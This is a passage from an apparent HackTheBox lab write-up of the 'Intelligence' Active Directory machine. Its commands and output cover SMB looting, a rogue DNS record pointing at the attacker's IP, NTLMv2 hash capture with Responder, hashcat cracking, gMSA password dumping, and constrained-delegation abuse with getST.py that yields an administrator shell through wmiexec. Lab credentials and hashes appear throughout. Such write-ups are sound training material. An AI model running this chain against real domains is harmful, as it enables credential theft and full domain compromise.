    "intelligence.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf"
  ],
  "Users": [
    "Default/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk",
    "Default/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini",
    "Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk",
    "Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk",
    "Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Notepad.lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/desktop.ini",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk",
    "Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk",
    "Default/NTUSER.DAT",
    "Default/NTUSER.DAT.LOG1",
    "Default/NTUSER.DAT.LOG2",
    "Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TM.blf",
    "Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000001.regtrans-ms",
    "Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000002.regtrans-ms",
    "Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf",
    "Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms",
    "Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TM.blf",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk",
    "Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Notepad.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/desktop.ini",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk",
    "Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk",
    "Tiffany.Molina/Desktop/user.txt",
    "Tiffany.Molina/NTUSER.DAT",
    "Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf",
    "Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms",
    "Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms",
    "Tiffany.Molina/ntuser.dat.LOG1",
    "Tiffany.Molina/ntuser.dat.LOG2",
    "Tiffany.Molina/ntuser.ini",
    "desktop.ini"
  ]
}
```

Found the `Tiffany.Molina/Desktop/user.txt` , so now, using the `smbclient` to get the flag and perform further enumeration.

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/]
└─$ smbclient -U Tiffany.Molina //10.10.10.248/Users    
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021
cd 
                3770367 blocks of size 4096. 1444509 blocks available
smb: \> cd Tiffany.Molina\
smb: \Tiffany.Molina\> ls
  .                                   D        0  Sun Apr 18 20:51:46 2021
  ..                                  D        0  Sun Apr 18 20:51:46 2021
  AppData                            DH        0  Sun Apr 18 20:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 20:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 20:51:46 2021
  Desktop                            DR        0  Sun Apr 18 20:51:46 2021
  Documents                          DR        0  Sun Apr 18 20:51:46 2021
  Downloads                          DR        0  Sat Sep 15 03:12:33 2018
  Favorites                          DR        0  Sat Sep 15 03:12:33 2018
  Links                              DR        0  Sat Sep 15 03:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 20:51:46 2021
  Music                              DR        0  Sat Sep 15 03:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 20:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT                        AHn   131072  Fri Jan 26 15:41:35 2024
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 20:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 20:51:46 2021
  Pictures                           DR        0  Sat Sep 15 03:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Saved Games                         D        0  Sat Sep 15 03:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 20:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 20:51:46 2021
  Videos                             DR        0  Sat Sep 15 03:12:33 2018
cd 
                3770367 blocks of size 4096. 1444509 blocks available
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Fri Jan 26 15:32:09 2024
get 
                3770367 blocks of size 4096. 1444509 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt 
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\>
```

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/]
└─$ cat user.txt 
...SNIP...                                                                                                                                                                                                                                                            
```

Now that i had the credentials of an user in the AD, i ran `bloodhound` to get a dump of the users/computers/permissions. I like the [Python collector](https://github.com/fox-it/BloodHound.py) for this case where I have creds but not a shell on the machine:

```bash
┌──(darshan㉿kali)-[/opt/BloodHound.py]
└─$ sudo python3 bloodhound.py -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All 
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 47S
```

On importing that into Bloodhound, Tiffany.Molina doesn’t have anything interesting:

![int-1](https://github.com/darshannn10/HackTheBox/assets/87711310/360c3e70-16cd-47ca-8da8-cbb83fd49d1b)


I also had Bloodhound look for AS-REP roastable and Kerberoastable users, but there were none of interest.

So, I decided to go back to the `smb` share. There’s not much else I can access in the `Users` share. `NETLOGON` is empty and `SYSVOL` has typical DC stuff, but nothing useful. 

Looking at the `IT` share I found a script: `downdetector.ps1` .

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ smbclient -U Tiffany.Molina //10.10.10.248/IT
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1444253 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> exit
l                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ ls
2020-01-01-upload.pdf  2020-12-15-upload.pdf  bloodhound-data  bloodhound.py  downdetector.ps1  files  nmap  __pycache__  scans  upload-files  users  users.txt                                                                                                                                                                                                                                                        
```

It’s a PowerShell script.

```powershell
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ cat downdetector.ps1                            
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
  try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
      Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}
```

The script goes into `LDAP` and gets a list of all the computers, and then loops over the ones where the name starts with `web`. It will try to issue a `web request` to that server (with the running user’s credentials), and if the status code isn’t `200`, it will email `Ted.Graves` and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.

`dnstool.py` is a script that comes with [`Krbrelayx`](https://github.com/dirkjanm/krbrelayx) that can:

```python
┌──(darshan㉿kali)-[/opt/krbrelayx]
└─$ python3 dnstool.py -u 'intelligence\tiffany.molina' -p 'NewIntelligenceCorpUser9876' --record 'webfak3r.intelligence.htb' --action add --type A --data 10.10.14.10 10.10.10.248 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```python
Here in the dnstool query, 
-u 'intelligence\\Tiffany.Molina' - The user to authenticate as;
-p 'NewIntelligenceCorpUser9876' - The user’s password;
--record 'webfak3r.intelligence.htb' - The domain to add;
--action add - Adding a new record;
--data 10.10.14.10 - The data to add, in this case, the IP to resolve 'webfak3r.intelligence.htb' to;
--type A - The type of record to add.
```

Running the script seems to work as i get a message that says: `LDAP operation completed successfully` . So, I’ll start a `netcat` listener to see any connections that come in.

```python
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.248] 63663
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1852
Host: webfak3r
Connection: Keep-Alive
```

Given that I know it’s using credentials, I’ll switch to [`Responder`](https://github.com/SpiderLabs/Responder) to try to capture a `Net-NTLMv2` hash. Responder runs with `sudo responder -I tun0`, and starts various servers, including HTTP.

If I try to set the DNS record again, it complains that it already exists, which I’ll take as a good sign:

```python
┌──(darshan㉿kali)-[/opt/krbrelayx]
└─$ python3 dnstool.py -u 'intelligence\tiffany.molina' -p NewIntelligenceCorpUser9876 --record webfak3r.intelligence.htb --action add --type A --data 10.10.14.10 10.10.10.248 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[!] Record already exists and points to 10.10.14.10. Use --action modify to overwrite or --allow-multiple to override this
```

After five minutes, there’s a connection at Responder and a hash for `Ted.Graves`:

```python
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:0aa403b0435e24a2:ABAD8594D6F7E7F88180E7831AEB4183:0101000000000000367A64730352DA01BF3317FBBFA2EFDC00000000020008005A0051003100380001001E00570049004E002D004500510036004300390044005A005300380046004A00040014005A005100310038002E004C004F00430041004C0003003400570049004E002D004500510036004300390044005A005300380046004A002E005A005100310038002E004C004F00430041004C00050014005A005100310038002E004C004F00430041004C00080030003000000000000000000000000020000054258B4C28C7BAA3486FCE33381E08349B8C483638B5D256B8898CD4437A00440A0010000000000000000000000000000000000009003C0048005400540050002F00770065006200660061006B00330072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Using `hashcat` to crack the hash:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ hashcat -m 5600 ted.greves.hash /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 4800HS with Radeon Graphics, 1441/2947 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
...
...

TED.GRAVES::intelligence:0aa403b0435e24a2:abad8594d6f7e7f88180e7831aeb4183:0101000000000000367a64730352da01bf3317fbbfa2efdc00000000020008005a0051003100380001001e00570049004e002d004500510036004300390044005a005300380046004a00040014005a005100310038002e004c004f00430041004c0003003400570049004e002d004500510036004300390044005a005300380046004a002e005a005100310038002e004c004f00430041004c00050014005a005100310038002e004c004f00430041004c00080030003000000000000000000000000020000054258b4c28c7baa3486fce33381e08349b8c483638b5d256b8898cd4437a00440a0010000000000000000000000000000000000009003c0048005400540050002f00770065006200660061006b00330072002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

...
...
```

 The credentials are: `Ted.Graves:Mr.Teddy`

I used `crackmapexec` to confirm the credentials: 

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy -d intelligence.htb

SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
```

And it worked!

Running `BloodHound` using `Ted Grave's` credentials

```python
┌──(darshan㉿kali)-[/opt/BloodHound.py]
└─$ sudo python3 bloodhound.py -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Ted.Graves -p Mr.Teddy -c All
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 50S
```

Importing the data in `BloodHound,` I found that Ted.Graves doesn’t have access to anything new over SMB, and at first glance, the previous Bloodhound collection as Tiffany.Molina doesn’t show anything particularly interesting with this account. There are no first degree object control or group delegated object control items. However, if I re-run with Ted.Graves credentials, there’s a slight difference:

![int-2](https://github.com/darshannn10/HackTheBox/assets/87711310/0e7ae60d-baed-45d0-b313-cecefdef791e)

![int-3](https://github.com/darshannn10/HackTheBox/assets/87711310/670cf1f6-b79e-42b9-9d84-1115d2e2aebc)


Here, `Ted.Graves` is in the `ITSupport` group, which has `ReadGMSAPassword` on SVC_INT. Even more interestingly, if I use the pre-built query `Shortest Path from Owned Principles`, the svc_int account has `AllowedToDelegate` on the DC:

![int-4](https://github.com/darshannn10/HackTheBox/assets/87711310/77dcb0e0-3345-4727-ae04-18e61acb385c)

![int-5](https://github.com/darshannn10/HackTheBox/assets/87711310/94a9bd29-e0e6-4bdf-be00-1fe497a7ba62)


[`Group Manage Service Accounts`](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-group-managed) (GMSA) provide additional security to service accounts. There’s a Python tool for extracting GMSA passwords, [`gMSADumper`](https://github.com/micahvandeusen/gMSADumper), which I decided to use.

```python
┌──(darshan㉿kali)-[/opt]
└─$ sudo git clone https://github.com/micahvandeusen/gMSADumper.git                                                         
[sudo] password for darshan: 
Cloning into 'gMSADumper'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 50 (delta 20), reused 35 (delta 13), pack-reused 0
Receiving objects: 100% (50/50), 36.93 KiB | 2.84 MiB/s, done.
Resolving deltas: 100% (20/20), done.
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[/opt]
└─$ cd gMSADumper

┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::e0dcda8d93bf71a6352ea7803c8f17f1
svc_int$:aes256-cts-hmac-sha1-96:fd6235dbfd8a560d17433b22022633ed7188588277cf4d174f6582daf2c5333f
svc_int$:aes128-cts-hmac-sha1-96:059ae234e725682d00c3c278b3cff01b
```

Validating the `svc_int$` hash using crackmapexec. 

```python
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ crackmapexec smb 10.10.10.248 -u svc_int$ -H e0dcda8d93bf71a6352ea7803c8f17f1
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\svc_int$:e0dcda8d93bf71a6352ea7803c8f17f1
```

And it works!

Now that we have a `NTLM` hash, I cannot crack it but I can use it to generate a `Silver Ticket` which can be passed. 

> To generate the `Silver Ticket` we need to run a script [`getST.py`](http://getST.py) which is a part of `Impacket` that’ll help in crafting the ticket. [This post from OnSecurity](https://www.onsecurity.io/blog/abusing-kerberos-from-linux/) gives the steps to request a forged ticket from the delegated service
> 

Before that we need to update the clock of the server `10.10.10.248`. `ntpdate` will update the time based on an NTP server, and based on the `nmap` scan at the start, Intelligence is running NTP.

```python
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ sudo ntpdate 10.10.10.248
2024-01-28 12:59:35.801577 (-0500) +25200.598475 +/- 0.125897 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25200.598475
```

Now when i ran the script, I still got an error saying `clock skew too great`

```python
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :e0dcda8d93bf71a6352ea7803c8f17f1 -impersonate administrator intelligence.htb/svc_int
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

In VirtualBox, I also had to stop the guest utils service with `sudo service virtualbox-guest-utils status`, or else it changed the time back about 30 seconds after I changed it.

```python
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ sudo service virtualbox-guest-utils stop                                                                                                                                                        
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ sudo ntpdate 10.10.10.248                                                                                                                                                                       
2024-01-28 14:04:46.747127 (-0500) +28801.210342 +/- 0.124649 10.10.10.248 s1 no-leap
CLOCK: time stepped by 28801.210342
```

Re-running the script again after performing necessary changes: 

```python
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ sudo /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :e0dcda8d93bf71a6352ea7803c8f17f1 -impersonate administrator intelligence.htb/svc_int
[sudo] password for darshan: 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

```bash
Here in the [getST.py](http://getST.py) query:  
-dc-ip '10.10.10.248'
-spn 'www/dc.intelligence.htb' - the SPN (see below)
-hashes ':e0dcda8d93bf71a6352ea7803c8f17f1' - the NTLM I collected earlier
-impersonate 'administrator' - the user I want a ticket for
'intelligence.htb/svc_int' - the account I’m running
```

To get the SPN, that’s in the Node Info -> Node Properties section for the svc_int user in Bloodhound:

![int-6](https://github.com/darshannn10/HackTheBox/assets/87711310/c99c705a-8e33-4c48-87c0-36683e82fd40)


Now that we have a `Silver Ticket`, running `wmiexec` to pass the `hash/ticket` to login as an `administrator`.

```bash
┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ export KRB5CCNAME=administrator.ccache

┌──(darshan㉿kali)-[/opt/gMSADumper]
└─$ sudo /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass administrator@dc.intelligence.htb           
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>
```

ROOT Flag

```bash
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of C:\

04/18/2021  04:52 PM    <DIR>          inetpub
04/18/2021  04:50 PM    <DIR>          IT
06/29/2021  01:30 PM             5,510 License.txt
04/18/2021  04:38 PM    <DIR>          PerfLogs
04/18/2021  04:23 PM    <DIR>          Program Files
04/18/2021  04:21 PM    <DIR>          Program Files (x86)
04/18/2021  05:20 PM    <DIR>          Users
01/28/2024  11:30 AM    <DIR>          Windows
               1 File(s)          5,510 bytes
               7 Dir(s)   5,983,678,464 bytes free

C:\>cd Users
C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>type root.txt
...SNIP...
```
